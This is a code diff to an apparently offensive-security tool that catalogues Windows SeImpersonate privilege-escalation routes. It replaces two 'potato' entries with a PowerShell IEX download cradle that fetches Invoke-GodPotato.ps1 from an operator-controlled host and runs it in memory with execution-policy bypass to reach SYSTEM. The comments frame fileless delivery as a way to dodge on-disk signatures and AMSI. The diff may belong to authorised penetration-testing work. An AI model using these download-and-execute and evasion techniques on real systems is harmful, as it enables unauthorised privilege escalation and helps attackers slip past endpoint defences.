@@ -62,6 +62,10 @@ class Vector:
     #: then stages — the loop builds+pushes these on a miss, rebuilds corrected on a
     #: BAD_BUILD. ``build_command`` is what the built artifact runs (None → poc's proof).
     builds: tuple = ()
+    #: arsenal artifacts to *serve over HTTP while the command runs* — the target pulls
+    #: them in-memory (e.g. a PowerShell IEX download-cradle), nothing on disk. The command
+    #: references the served base via the ``{url}`` placeholder. Needs a reachable lhost.
+    serves: tuple = ()
     #: set when the route needs operator hands after fieldkit builds the artifact — the
     #: escalate loop won't auto-fire it; `fieldkit prep` renders the steps.
     playbook: object = None
@@ -291,19 +295,16 @@ WIN_IMPERSONATION = tuple(
          stages=((tool, f"{{stage}}\\{tool}.exe"),), detail=note)
     for slug, tool, cmd, note in _POTATOES
 ) + (
-    dict(key="seimpersonate:inmem", delivery="inmem-fileless", detection="moderate",
-         title="SeImpersonate → SYSTEM (in-memory potato)",
-         needs="a potato assembly + an in-memory .NET loader staged in {stage}",
-         command='{stage}\\loader.exe potato "cmd /c whoami"',
-         cleanup=None,
-         detail="load a potato reflectively — nothing on disk, but a managed loader "
-                "(AMSI surface). Climb here when the on-disk EXEs are caught."),
-    dict(key="seimpersonate:ps", delivery="ps-amsi-revshell", detection="loud",
-         title="SeImpersonate → SYSTEM (PowerShell potato)",
-         needs="an AMSI-patched PowerShell potato in {stage}",
-         command='powershell -ep bypass -f {stage}\\potato.ps1',
-         cleanup="del {stage}\\potato.ps1", shell="powershell",
-         detail="script-delivered potato — the most AMSI-exposed path, last resort."),
+    dict(key="seimpersonate:iex-godpotato", delivery="inmem-fileless", detection="moderate",
+         title="SeImpersonate → SYSTEM (Invoke-GodPotato, in-memory IEX)",
+         needs="Invoke-GodPotato.ps1 in the arsenal + a reachable lhost (config set lhost=)",
+         command="powershell -ep bypass -c \"IEX(New-Object Net.WebClient)."
+                 "DownloadString('{url}Invoke-GodPotato.ps1'); "
+                 "Invoke-GodPotato -Cmd 'cmd /c whoami'\"",
+         cleanup=None, shell="cmd", serves=("Invoke-GodPotato.ps1",),
+         detail="download + IEX the GodPotato PowerShell port in memory — nothing lands on "
+                "disk, so the on-disk EXE signature is moot. The loop climbs here when the "
+                "native Potatoes are caught; fieldkit serves the .ps1 while it runs."),
 )
 
 
@@ -321,7 +322,8 @@ def _impersonation_vector(spec, ctx, evidence):
         evidence=evidence,
         safe_proof="the vector runs `whoami` in the SYSTEM context.",
         cleanup=cleanup, report_type="seimpersonate",
-        family="seimpersonate", delivery=spec["delivery"], stages=stages)
+        family="seimpersonate", delivery=spec["delivery"], stages=stages,
+        serves=spec.get("serves", ()))
 
 
 def _win_vector(spec, ctx, evidence):
